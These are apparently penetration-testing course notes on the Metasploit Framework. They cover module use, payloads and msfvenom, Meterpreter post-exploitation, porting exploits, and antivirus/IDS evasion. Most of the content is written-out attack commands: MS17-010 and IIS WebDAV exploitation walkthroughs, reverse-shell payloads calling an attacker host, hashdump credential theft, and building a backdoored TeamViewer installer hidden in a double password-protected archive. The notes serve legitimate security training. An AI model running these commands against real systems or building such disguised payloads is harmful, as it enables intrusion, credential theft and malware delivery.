# Metasploit Framework

## Preface

Tools are time-savers, not a backbone — never let them create tunnel vision. Know every tool intimately (docs, functions, classes): unpredictable tools leave traces on targets or open gates on your own platform. A failed MSF exploit only proves that exploit failed, not that the vulnerability is absent — most need target-specific customization.

## Introduction to Metasploit

Ruby-based, modular pentest platform: write/test/execute exploit code, enumerate, attack, evade. Not a jack-of-all-trades — a swiss army knife for the most common unpatched vulnerabilities.

### Metasploit Pro

Framework = open source, free, community-driven. Pro adds: task chains, social engineering, vulnerability validation, GUI, quick-start wizards, Nexpose integration (plus its own console for CLI people).

### Metasploit Framework Console

msfconsole is the only supported way to reach most features, the most stable interface, has readline/tab-completion, and runs external commands. Sessions and jobs work like browser tabs for controlling multiple targets.

### Understanding the Architecture

Everything lives under `/usr/share/metasploit-framework`:

```bash
ls /usr/share/metasploit-framework/modules    # auxiliary encoders evasion exploits nops payloads post
ls /usr/share/metasploit-framework/plugins    # nessus.rb openvas.rb sqlmap.rb wmap.rb ...
ls /usr/share/metasploit-framework/scripts    # meterpreter ps resource shell
ls /usr/share/metasploit-framework/tools      # exploit memdump password recon ...
```

Data/Lib make msfconsole function; Documentation holds the technical details. Knowing these locations matters when importing or writing modules.

## Introduction to MSFconsole

```bash
msfconsole        # splash + prompt
msfconsole -q     # no banner
sudo apt update && sudo apt install metasploit-framework   # keep it current
```

Enumeration always precedes exploitation: identify services and their versions — unpatched/outdated versions on public services are usually the way in.

MSF engagement structure to navigate the framework by: **Enumeration** (service validation, vulnerability research) → **Preparation** (code auditing) → **Exploitation** (module execution) → **Privilege Escalation** → **Post-Exploitation** (pivoting, data exfiltration).

## Modules

Module naming: `<No.> <type>/<os>/<service>/<name>` — e.g. `794 exploit/windows/ftp/scriptftp_list`.

Module types:

* **Auxiliary** — scanning, fuzzing, sniffing, admin capabilities
* **Encoders** — keep payloads intact en route to the destination
* **Exploits** — exploit a vulnerability, allow payload delivery
* **NOPs** — keep payload sizes consistent across attempts
* **Payloads** — code that runs remotely and calls back
* **Plugins** — extra scripts integrated into msfconsole
* **Post** — gather info, pivot deeper

Only auxiliary, exploits, and post are directly usable via `use <no.>`.

### Searching for Modules

`help search` for everything. Useful keywords: `cve:`, `platform:`, `type:`, `rank:`, `name:`, `edb:`, `bid:`, `port:`, `arch:`, `target:`, `date:`. Prepending a value with `-` excludes matches. Options: `-S` regex filter, `-s <column>` sort, `-r` reverse, `-o file` CSV output, `-u` use if single result.

```
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

### Module Selection

Classic flow against an SMB target (nmap shows 445 open, Windows 7-ish):

```
search ms17_010
use 0                                  # exploit/windows/smb/ms17_010_psexec
options                                # Required = yes entries must be set
info                                   # description, refs, targets — audit before use
set RHOSTS <TARGET_IP>
setg RHOSTS <TARGET_IP>                # setg = persistent until restart
setg LHOST <ATTACKER_IP>               # callback address for reverse payloads
run
```

`info` first is best practice — familiarize with the exploit's functionality and check for artifacts it generates. Result: Meterpreter session → `shell` → `whoami` → `nt authority\system`.

## Targets

Targets adapt the exploit to a specific OS version/SP/language — the return address (jmp esp, register jump, pop/pop/ret) shifts between them. Inside an exploit module:

```
show targets
set target 6        # when you already know the version
```

`Automatic` (target 0) makes MSF do service detection first. To identify a target for a custom port: obtain the target binaries and use `msfpescan` to locate a suitable return address.

## Payloads

Three payload types; `/` in the name separates stager from stage (`windows/shell/bind_tcp`), singles are pressed together (`windows/shell_bind_tcp`).

* **Singles** — exploit + entire shellcode inline; self-contained, more stable, but large (some exploits won't fit them).
* **Stagers** — small and reliable; run on the victim and open the connection back. NX vs NO-NX variants (NX stagers are bigger — VirtualAlloc; default is now NX + Win7 compatible).
* **Stages** — downloaded by the stager, no size limits: Meterpreter, VNC injection. Large stages automatically use a middle stager (single recv() would fail).

**Stage0** = the initial shellcode whose only job is calling back (`reverse_tcp`, `reverse_https`, `bind_tcp`). Reverse wins most of the time — victim-initiated outbound traffic slips past inbound filtering, though security teams know this too.

### Meterpreter Payload

DLL-injected, resides entirely in memory, no disk traces, hard to detect with conventional forensics; scripts/plugins load dynamically. Post-exploitation workhorse: privesc hunting, AV evasion, persistence, pivoting.

### Searching for and Selecting Payloads

`show payloads` inside a module is already filtered to the target platform. Chain `grep` to cut the list down:

```
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads     # count matches
set payload 15                        # windows/x64/meterpreter/reverse_tcp
```

Payload options (LHOST/LPORT) appear only after selection. `ifconfig` runs directly inside msfconsole, and `set LHOST tun0` accepts an interface name. Then `run` → session opens as SYSTEM on a clean MS17-010 hit.

Common Windows payload families: `generic/custom`, `generic/shell_bind_tcp`, `generic/shell_reverse_tcp`, `windows/x64/exec`, `windows/x64/loadlibrary`, `windows/x64/messagebox`, `windows/x64/shell_reverse_tcp`, `windows/x64/shell/reverse_tcp`, `windows/x64/meterpreter/*`, `windows/x64/powershell/*`, `windows/x64/vncinject/*`. Empire and Cobalt Strike payloads are the professional-world equivalents (out of scope).

## Encoders

Encoders exist for architecture compatibility (x64/x86/sparc/ppc/mips) and bad-character removal; their AV-evasion value has faded as detection caught up. Shikata Ga Nai was king once — not anymore.

Pre-2015 this was two tools piped together (`msfpayload ... R | msfencode -b '\x00' ...`); msfvenom replaced both:

```bash
# no explicit encoder
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

# with SGN — first bytes of $buf change
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Inside msfconsole, `show encoders` lists encoders compatible with the current exploit+payload combo (x86 list includes alpha\_mixed, countdown, fnstenv\_mov, x86/shikata\_ga\_nai — rank excellent, polymorphic XOR additive feedback).

Reality check with VirusTotal:

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -e x86/shikata_ga_nai -f exe -o TeamViewerInstall.exe
# 1 iteration  → 54/69 engines detect
# -i 10        → 52/65 — barely better

msf-virustotal -k <API key> -f TeamViewerInstall.exe
```

Encoding alone is dead as an evasion strategy; signature-only analysis is history (heuristics, ML, DPI).

## Databases

PostgreSQL-backed tracking of hosts, services, creds, loot — essential once targets multiply. Setup:

```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init      # creates user/dbs + database.yml; init errors often mean MSF needs an apt update
sudo msfdb status
sudo msfdb run       # init + launch msfconsole connected
```

Reinit path when the msf password is stuck:

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
db_status            # [*] Connected to msf. Connection type: PostgreSQL.
```

Core commands: `db_connect`, `db_disconnect`, `db_export`, `db_import`, `db_nmap`, `db_status`, `hosts`, `services`, `vulns`, `creds`, `loot`, `notes`, `workspace`.

### Workspaces

Segregate results per IP/subnet/domain:

```
workspace                  # list (* = current)
workspace -a Target_1      # add + switch
workspace Target_1         # switch
workspace -d Target_1      # delete   (-D deletes all)
```

### Getting data in and out

```
db_import Target.xml       # nmap XML preferred; then check hosts / services
db_nmap -sV -sS <TARGET_IP>   # run nmap from inside msfconsole, results stored automatically

db_export -f xml backup.xml   # or pwdump format
```

### hosts / services / creds / loot

* `hosts` / `services` — auto-populated tables; `-R` sets RHOSTS from the results, `-S` filters, `-o` CSV out, `-a` add manually, `-u` only up.
* `creds` — list/add credentials. Adding examples worth remembering:

```
creds add user:admin password:notpassword realm:workgroup
creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
creds add user:sshadmin ssh-key:/path/to/id_rsa
creds -t NTLM                # filter by type; -o out.jtr / out.hcat for crackers
```

* `loot` — hash dumps and pulled artifacts (`loot -f file -i info -a <addr> -t type`).

## Plugins

Third-party tools integrated into msfconsole; they work with the API and auto-document results into the database. Pre-installed ones live in `/usr/share/metasploit-framework/plugins` (nessus, nexpose, openvas, sqlmap, wmap...).

```
msf6 > load nessus
nessus_help
```

Installing custom plugins — drop the `.rb` in the plugins dir:

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

```
load pentest     # adds command groups: auto_exploit, discovery, postauto (multi_cmd, multi_post, sys_creds...)
```

Popular: nMap, NexPose, Nessus, Mimikatz (v1), Stdapi, Priv, Incognito, Railgun, Darkoperator's. Framework is Ruby — extensibility comes from Mixins (inclusion via `include`, not inheritance); only relevant once you write your own modules.

## Sessions

Background any channel-forming module with CTRL+Z or `background`/`bg` — the session keeps running. Then:

```
sessions            # list active sessions
sessions -i 1       # interact
```

Post modules (credential gatherers, local exploit suggesters, internal network scanners) take a `SESSION` option to bind to an existing session.

### Jobs

CTRL+C on an exploit does not free its listener port — kill the job instead:

```
exploit -j          # run as background job
jobs -l             # list
jobs -k <id>        # kill one
jobs -K             # kill all
```

## Meterpreter

Memory-only, DLL-injected, AES-encrypted channel (MSF6). Load sequence on exploit completion: stager executes → Reflective DLL loads/injects → core initializes AES link → extensions load (`stdapi` always; `priv` when running as admin).

Command map worth internalizing (full list via `help`):

* Core: `background`, `migrate`, `pgrep`/`ps`/`kill`, `steal_token`/`drop_token`, `getpid`, `load`, `sleep`, `channel`
* FS: `ls`/`cd`/`cat`/`search`/`upload`/`download`/`edit`/`show_mount`
* Network: `ifconfig`/`ipconfig`, `arp`, `netstat`, `route`, `portfwd`, `resolve`
* System: `getuid`, `sysinfo`, `getprivs`, `getsid`, `execute`, `reg`, `reboot`/`shutdown`, `shell`
* UI: `screenshot`, `screenshare`, `keyscan_start`/`keyscan_dump`/`keyscan_stop`, `webcam_snap`/`webcam_stream`, `record_mic`
* Priv: `getsystem`, `hashdump`, `timestamp`

### Using Meterpreter — Full Walkthrough Shape

```
db_nmap -sV -p- -T5 -A <TARGET_IP>       # IIS 6.0, WebDAV methods incl. PUT/MOVE
search iis_webdav_upload_asp
use 0
set RHOST <TARGET_IP>
set LHOST tun0
run
```

Module uploads payload as .txt, moves it to .asp, executes, then tries to delete — deletion can fail (403), leaving `metasploit<RAND>.asp` on disk. From the defender's side, regex-matching filenames like that kills such attacks early; from ours, it's a liability to remember.

Landed with no privileges (`getuid` → access denied):

```
ps                       # find a process like wmiprvse.exe (NT AUTHORITY\NETWORK SERVICE)
steal_token 1836         # its PID → token stolen, getuid now works
```

Escalate via the suggester:

```
bg
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run                      # lists candidates with "appears to be vulnerable"
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST tun0
run                      # → new session as NT AUTHORITY\SYSTEM
```

Then loot as SYSTEM: `hashdump` (full SAM dump), `lsa_dump_sam`, `lsa_dump_secrets` (service account passwords, DPAPI keys, NL$KM).

## Writing and Importing Modules

Missing module locally? Update MSF, or grab it from ExploitDB — filter by the _Metasploit Framework_ tag (`https://www.exploit-db.com/?tag=3`), or use searchsploit:

```bash
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"     # .rb endings = MSF-compatible candidates
```

Not every `.rb` is an MSF module (plain Ruby exploits exist too). Install:

```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

Naming rules: snake\_case, alphanumeric, underscores (never dashes) — violations break recognition. Then load it:

```
msfconsole -m /usr/share/metasploit-framework/modules/
# or inside a running console:
loadpath /usr/share/metasploit-framework/modules/
reload_all
use exploit/unix/webapp/nagios3_command_injection
```

### Porting Over Scripts into Metasploit Modules

Porting needs Ruby (MSF modules always use hard tabs). Don't start from scratch — take an existing module in the same category as boilerplate. Example: porting the Bludit 3.9.2 auth bruteforce mitigation bypass, using `bludit_upload_images_exec.rb` as the base.

Skeleton essentials:

```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient   # act as HTTP client
  include Msf::Exploit::PhpEXE               # first-stage php payload
  include Msf::Exploit::FileDropper          # file transfer + cleanup (dropped — not needed here)
  include Msf::Auxiliary::Report             # report data to the MSF DB
```

Then the `initialize` info block (Name, Description, Author, References with CVE/URLs, Platform, Arch, Targets, DisclosureDate) and options — swapping `BLUDITPASS` for a wordlist since this exploit bruteforces:

```ruby
OptPath.new('PASSWORDS', [ true, 'The list of passwords',
    File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
```

The vulnerability's core, preserved in the ported module: `getUserIp` in `bl-kernel/security.class.php` trusts `X-Forwarded-For`/`Client-IP`, so each login attempt spoofs a fresh IP (`'X-Forwarded-For' => "#{i}-#{password[..4]}"`) and never trips the 10-failed-logins block. Cross-reference mixins/classes/methods against the Metasploit documentation when in doubt.

## Introduction to MSFVenom

msfvenom = msfpayload + msfencode merged. Clean shellcode per arch/OS is the point now; AV evasion via encoding is largely over (52/65 detection on a simple encoded payload).

### Creating Our Payloads

Scenario shape: anonymous FTP whose root is served by a web app that executes uploads.

```bash
nmap -sV -T4 -p- <TARGET_IP>          # 21 ftp (Microsoft ftpd), 80 http (IIS 7.5)
ftp <TARGET_IP>                        # anonymous login; aspnet_client dir → aspx will run

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f aspx > reverse_shell.aspx
# in ftp: put reverse_shell.aspx
```

Catch it — multi/handler must mirror the payload settings:

```
use multi/handler
set LHOST <ATTACKER_IP>
set LPORT 1337
run
```

Browse to `http://<TARGET_IP>/reverse_shell.aspx` (blank page = payload still fired) → session as `IIS APPPOOL\Web`. If Meterpreter sessions keep dying, encoding the payload can improve runtime stability.

### Local Exploit Suggester

Low-priv shell + x86 architecture → run it:

```
use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

Work the list top-down: `bypassuac_eventvwr` failed (IIS user isn't in the administrators group — expected), `ms10_015_kitrap0d` delivered SYSTEM. Local exploits also take `SESSION`; use a fresh LPORT (e.g. 1338) for the new handler. Not all suggester results are accurate — expect to try a few.

## Firewall and IDS/IPS Evasion

Defender landscape: **endpoint protection** (per-host AV/antimalware/firewall/anti-DDoS bundles) and **perimeter protection** (edge devices), with the DMZ between them housing public-facing servers.

Security policies = allow/deny lists (ACL-style) targeting traffic, applications, user access, files, DDoS. Matching engines:

* **Signature-based** — packet comparison against known attack signatures; 100% match → alarm. Most host AV still leans on this.
* **Heuristic/statistical anomaly** — deviation from a learned baseline (incl. APT modus-operandi signatures).
* **Stateful protocol analysis** — divergence from pre-built profiles of benign protocol behavior.
* **SOC live monitoring** — analysts on a live feed.

MSF6 tunnels AES-encrypted Meterpreter comms — mostly handles network IDS/IPS. Sender-IP-flagging rulesets are beaten by riding allowed services (Equifax 2017: Struts foothold + months of unnoticed DNS exfiltration). Remaining problem is the payload file on disk pre-execution, where signature matching kills it — default MSF payloads are all in AV databases by now.

Backdoored executables — inject shellcode into a legitimate binary:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

`-x` = template, `-k` = keep the original app running normally while the payload runs in a separate thread (only giveaway: a console-launched copy pops a payload window).

Archives — password-protected double-RAR defeats most signatures:

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5    # 11/59 on VT
msf-virustotal -k <API key> -f test.js

wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js && mv test.rar test        # password, strip .rar
rar a test2.rar -p test && mv test2.rar test2            # second layer
msf-virustotal -k <API key> -f test2                     # 0/49
```

Caveats: locked archives surface on the AV dashboard as unscannable, and uploading anything to VT licenses worldwide redistribution — think before submitting engagement payloads.

Packers (UPX, Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida) compress payload+decompressor into one file, transparently restoring the original at run.

Exploit coding: randomize buffer patterns (Offset switches in the module's Targets) and avoid obvious NOP sleds — both are IPS-signature staples. Sandbox-test custom exploits first; you may get one shot on the assessment.
